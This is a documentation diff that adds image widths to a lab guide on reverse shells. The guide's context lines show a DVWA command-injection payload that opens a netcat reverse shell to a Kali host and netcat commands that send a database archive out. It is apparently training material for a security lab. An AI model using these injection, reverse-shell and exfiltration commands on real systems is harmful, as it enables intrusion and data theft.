@@ -11,6 +11,7 @@ A reverse shell is a shell session established on a connection that is initiated
        msfconsole
 
      .. image:: ../images/Attacks/Picture12.png
+          :width: 450
 #. Running a ‘reverse-shell’ module on Kali
      In the Kali Web Shell run the command:
 
@@ -22,6 +23,7 @@ A reverse shell is a shell session established on a connection that is initiated
        run
       
      .. image:: ../images/Attacks/Picture13.png
+          :width: 550
 #. Run reverse shell command from DVWA
      In the XRDP Web Browser for DVWA run the command:
 
@@ -30,6 +32,7 @@ A reverse shell is a shell session established on a connection that is initiated
        | nc 10.1.50.8 4444 -e /bin/sh &
 
      .. image:: ../images/Attacks/Picture14.png
+          :width: 700
 #. Execute shell commands from Kali
      In the Kali Web Shell **Press Enter 1x prior to running commands**
   
@@ -39,9 +42,11 @@ A reverse shell is a shell session established on a connection that is initiated
        ls -AlFh
 
      .. image:: ../images/Attacks/Picture15.png
+          :width: 500
 #. Open a New Web Shell in Kali
 
      .. image:: ../images/Attacks/Picture16.png
+          :width: 600
 #. Setup Data Exfiltration from Kali (2nd Web Shell [New Shell Window])
 
      .. code-block::
@@ -51,6 +56,7 @@ A reverse shell is a shell session established on a connection that is initiated
        nc -l -p 8888 > Sample-DB.zip
 
      .. image:: ../images/Attacks/Picture17.png
+          :width: 800
 #. Run Data Exfiltration command from Kali (1st Web Shell [Reverse Shell Window])
 
      .. code-block::
@@ -58,6 +64,7 @@ A reverse shell is a shell session established on a connection that is initiated
        nc -w 3 10.1.50.8 8888 < Sample-DB.zip
 
      .. image:: ../images/Attacks/Picture18.png
+          :width: 600
 #. Check Exfiltrated file on Kali from the compromised server (2nd Web Shell [New Shell Window])
      If file has size (~93MB) then the data exfiltration was successful
 
@@ -66,3 +73,4 @@ A reverse shell is a shell session established on a connection that is initiated
        ls -AlFh |grep -I Sample
 
      .. image:: ../images/Attacks/Picture19.png
+          :width: 500
